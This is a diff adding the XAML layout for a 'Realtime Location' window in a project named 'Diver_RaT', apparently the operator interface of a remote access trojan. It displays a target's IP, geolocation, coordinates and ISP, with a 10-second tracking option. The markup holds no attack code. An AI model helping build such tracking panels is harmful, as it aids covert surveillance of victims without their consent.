@@ -1,0 +1,93 @@
+<Window x:Class="Diver_RaT.LocationWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+        mc:Ignorable="d"
+        xmlns:shell="clr-namespace:System.Windows.Shell;assembly=PresentationFramework"
+        xmlns:ui="clr-namespace:Diver_RaT"
+        WindowStyle="None"
+        ResizeMode="CanResize"
+        Title="Realtime Location" Height="520" Width="620"
+        WindowStartupLocation="CenterOwner"
+        Background="{StaticResource WindowBgBrush}"
+        Foreground="#E6E8EF">
+
+    <WindowChrome.WindowChrome>
+        <WindowChrome CaptionHeight="0" GlassFrameThickness="1" ResizeBorderThickness="6"
+                      CornerRadius="8" UseAeroCaptionButtons="False"/>
+    </WindowChrome.WindowChrome>
+
+    <Grid>
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="*"/>
+        </Grid.RowDefinitions>
+        <ui:CustomTitleBar Grid.Row="0" Title="Realtime Location"/>
+        <Grid Grid.Row="1" Margin="16">
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="*"/>
+            <RowDefinition Height="Auto"/>
+        </Grid.RowDefinitions>
+
+        <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,10">
+            <Border Width="12" Height="12" CornerRadius="3" Background="{StaticResource LimeBrush}" VerticalAlignment="Center" Margin="0,0,8,0"/>
+            <TextBlock Text="REALTIME LOCATION" FontSize="15" FontWeight="Bold" Foreground="{StaticResource LimeBrush}" VerticalAlignment="Center"/>
+            <TextBlock x:Name="TargetText" FontSize="13" Foreground="{StaticResource MutedBrush}" Margin="10,2,0,0" VerticalAlignment="Center"/>
+        </StackPanel>
+
+        <StackPanel Grid.Row="1" Orientation="Horizontal" Margin="0,0,0,10">
+            <Button x:Name="RefreshButton" Content="&#x21bb;  Refresh" Click="RefreshButton_Click" Padding="12,0" Margin="0,0,8,0" Height="30"/>
+            <Button x:Name="MapsButton" Content="&#x1f5fa;  Open in Maps" Click="MapsButton_Click" Padding="12,0" Margin="0,0,12,0" Height="30" IsEnabled="False"/>
+            <CheckBox x:Name="RealtimeCheck" Content="Realtime (10s)" Foreground="{StaticResource MutedBrush}"
+                      VerticalAlignment="Center" Margin="4,0,0,0" Checked="Realtime_Changed" Unchecked="Realtime_Changed"/>
+        </StackPanel>
+
+        <Border Grid.Row="2" Background="{StaticResource PanelGlassBrush}" CornerRadius="8"
+                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1" Padding="16">
+            <ScrollViewer VerticalScrollBarVisibility="Auto">
+                <Grid>
+                    <Grid.RowDefinitions>
+                        <RowDefinition Height="Auto"/>
+                        <RowDefinition Height="Auto"/>
+                        <RowDefinition Height="Auto"/>
+                        <RowDefinition Height="Auto"/>
+                        <RowDefinition Height="Auto"/>
+                        <RowDefinition Height="Auto"/>
+                        <RowDefinition Height="Auto"/>
+                        <RowDefinition Height="Auto"/>
+                    </Grid.RowDefinitions>
+                    <Grid.ColumnDefinitions>
+                        <ColumnDefinition Width="130"/>
+                        <ColumnDefinition Width="*"/>
+                    </Grid.ColumnDefinitions>
+
+                    <TextBlock Grid.Row="0" Grid.Column="0" Text="Public IP" Foreground="{StaticResource MutedBrush}" FontWeight="SemiBold" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="0" Grid.Column="1" x:Name="IpValue" FontSize="15" FontWeight="Bold" Foreground="#D6FF7A" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="1" Grid.Column="0" Text="Country" Foreground="{StaticResource MutedBrush}" FontWeight="SemiBold" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="1" Grid.Column="1" x:Name="CountryValue" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="2" Grid.Column="0" Text="Region" Foreground="{StaticResource MutedBrush}" FontWeight="SemiBold" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="2" Grid.Column="1" x:Name="RegionValue" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="3" Grid.Column="0" Text="City" Foreground="{StaticResource MutedBrush}" FontWeight="SemiBold" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="3" Grid.Column="1" x:Name="CityValue" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="4" Grid.Column="0" Text="Coordinates" Foreground="{StaticResource MutedBrush}" FontWeight="SemiBold" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="4" Grid.Column="1" x:Name="CoordValue" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="5" Grid.Column="0" Text="ISP" Foreground="{StaticResource MutedBrush}" FontWeight="SemiBold" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="5" Grid.Column="1" x:Name="IspValue" TextWrapping="Wrap" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="6" Grid.Column="0" Text="Organization" Foreground="{StaticResource MutedBrush}" FontWeight="SemiBold" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="6" Grid.Column="1" x:Name="OrgValue" TextWrapping="Wrap" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="7" Grid.Column="0" Text="Updated" Foreground="{StaticResource MutedBrush}" FontWeight="SemiBold" Margin="0,8,0,4"/>
+                    <TextBlock Grid.Row="7" Grid.Column="1" x:Name="UpdatedValue" Margin="0,8,0,4"/>
+                </Grid>
+            </ScrollViewer>
+        </Border>
+
+        <TextBlock x:Name="StatusText" Grid.Row="3" Margin="2,8,0,0" FontSize="12"
+                   Foreground="{StaticResource MutedBrush}"/>
+        </Grid>
+        <Border CornerRadius="8" BorderBrush="{StaticResource WindowFrameBrush}" BorderThickness="2"
+                Panel.ZIndex="9999" Grid.RowSpan="2" IsHitTestVisible="False"/>
+    </Grid>
+</Window>
